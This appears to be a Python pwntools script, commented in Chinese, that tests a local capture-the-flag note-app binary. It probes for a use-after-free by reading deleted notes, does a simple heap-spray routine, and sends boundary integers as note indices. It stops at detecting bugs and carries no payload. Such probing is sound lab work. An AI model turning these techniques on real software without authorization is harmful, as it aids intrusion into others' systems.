#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
直接漏洞触发测试脚本
使用pwntools直接测试UAF漏洞
"""

from pwn import *
import time

def test_uaf_directly():
    """直接测试UAF漏洞"""
    print("开始直接测试UAF漏洞...")
    
    # 启动程序
    io = process('./all-pwn-red-book/pwn')
    io.recvuntil(b"Welcome to the All-Pwn-Red-Book App!")
    print("[+] 程序已启动")
    
    try:
        # 创建第一个笔记
        print("[+] 创建第一个笔记...")
        io.sendline(b"1")  # 选择创建笔记
        io.recvuntil(b"NOTE TYPE")
        io.sendline(b"1")  # 笔记类型1
        io.recvuntil(b"Please enter note content:")
        io.sendline(b"First note content")
        
        response = io.recvline()
        print(f"[+] 创建笔记响应: {response}")
        
        # 创建第二个笔记
        print("[+] 创建第二个笔记...")
        io.sendline(b"1")  # 选择创建笔记
        io.recvuntil(b"NOTE TYPE")
        io.sendline(b"2")  # 笔记类型2
        io.recvuntil(b"Please enter note content:")
        io.sendline(b"Second note content")
        
        response = io.recvline()
        print(f"[+] 创建笔记响应: {response}")
        
        # 删除第一个笔记
        print("[+] 删除第一个笔记...")
        io.sendline(b"5")  # 选择删除笔记
        io.recvuntil(b"Note number")
        io.sendline(b"0")  # 删除笔记0
        
        response = io.recvuntil(b"Pick your main character move")
        print(f"[+] 删除笔记响应: {response}")
        
        # 尝试访问已删除的笔记
        print("[+] 尝试访问已删除的笔记...")
        io.sendline(b"3")  # 选择显示笔记内容
        io.recvuntil(b"Note number")
        io.sendline(b"0")  # 访问笔记0
        
        try:
            response = io.recvuntil(b"Pick your main character move", timeout=5)
            print(f"[+] 访问已删除笔记响应: {response}")
            
            # 检查是否成功访问了已删除的笔记
            if b"Note Content:" in response:
                print("[!] 发现UAF漏洞 - 能够访问已删除的笔记!")
                return True
            else:
                print("[-] 无法访问已删除的笔记")
                return False
                
        except:
            print("[-] 程序可能崩溃了")
            return False
            
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False
    finally:
        io.close()

def test_heap_spray():
    """测试堆喷射"""
    print("\n开始测试堆喷射...")
    
    io = process('./all-pwn-red-book/pwn')
    io.recvuntil(b"Welcome to the All-Pwn-Red-Book App!")
    print("[+] 程序已启动")
    
    try:
        # 创建大量笔记
        print("[+] 创建大量笔记...")
        for i in range(10):
            io.sendline(b"1")  # 选择创建笔记
            io.recvuntil(b"NOTE TYPE")
            io.sendline(b"1")  # 笔记类型1
            io.recvuntil(b"Please enter note content:")
            io.sendline(f"Heap spray note {i}".encode())
            
            response = io.recvline()
            print(f"[+] 创建笔记{i}响应: {response}")
        
        # 删除一些笔记
        print("[+] 删除一些笔记...")
        for i in range(5):
            io.sendline(b"5")  # 选择删除笔记
            io.recvuntil(b"Note number")
            io.sendline(str(i).encode())  # 删除笔记i
            
            response = io.recvuntil(b"Pick your main character move")
            print(f"[+] 删除笔记{i}响应: {response}")
        
        # 尝试访问已删除的笔记
        print("[+] 尝试访问已删除的笔记...")
        for i in range(3):
            io.sendline(b"3")  # 选择显示笔记内容
            io.recvuntil(b"Note number")
            io.sendline(str(i).encode())  # 访问笔记i
            
            try:
                response = io.recvuntil(b"Pick your main character move", timeout=3)
                print(f"[+] 访问已删除笔记{i}响应: {response}")
                
                if b"Note Content:" in response:
                    print(f"[!] 发现UAF漏洞 - 能够访问已删除的笔记{i}!")
                    return True
                    
            except:
                print(f"[-] 访问笔记{i}失败")
        
        return False
        
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False
    finally:
        io.close()

def test_integer_overflow():
    """测试整数溢出"""
    print("\n开始测试整数溢出...")
    
    io = process('./all-pwn-red-book/pwn')
    io.recvuntil(b"Welcome to the All-Pwn-Red-Book App!")
    print("[+] 程序已启动")
    
    try:
        # 测试边界值
        test_values = [0x7fffffff, 0x80000000, 0xffffffff]
        
        for value in test_values:
            print(f"[+] 测试整数: {value} (0x{value:x})")
            
            io.sendline(b"3")  # 选择显示笔记内容
            io.recvuntil(b"Note number")
            io.sendline(str(value).encode())  # 访问笔记value
            
            try:
                response = io.recvuntil(b"Pick your main character move", timeout=3)
                print(f"[+] 访问笔记{value}响应: {response}")
                
                if b"Note Content:" in response:
                    print(f"[!] 发现整数溢出漏洞 - 能够访问笔记{value}!")
                    return True
                    
            except:
                print(f"[-] 访问笔记{value}失败")
        
        return False
        
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False
    finally:
        io.close()

def main():
    print("开始直接漏洞触发测试...")
    
    # 测试UAF漏洞
    uaf_found = test_uaf_directly()
    
    # 测试堆喷射
    heap_spray_found = test_heap_spray()
    
    # 测试整数溢出
    integer_overflow_found = test_integer_overflow()
    
    print("\n=== 漏洞测试结果 ===")
    print(f"UAF漏洞: {'发现' if uaf_found else '未发现'}")
    print(f"堆喷射: {'发现' if heap_spray_found else '未发现'}")
    print(f"整数溢出: {'发现' if integer_overflow_found else '未发现'}")
    
    if any([uaf_found, heap_spray_found, integer_overflow_found]):
        print("\n[!] 发现可利用漏洞!")
    else:
        print("\n[-] 未发现明显的漏洞")

if __name__ == "__main__":
    main()
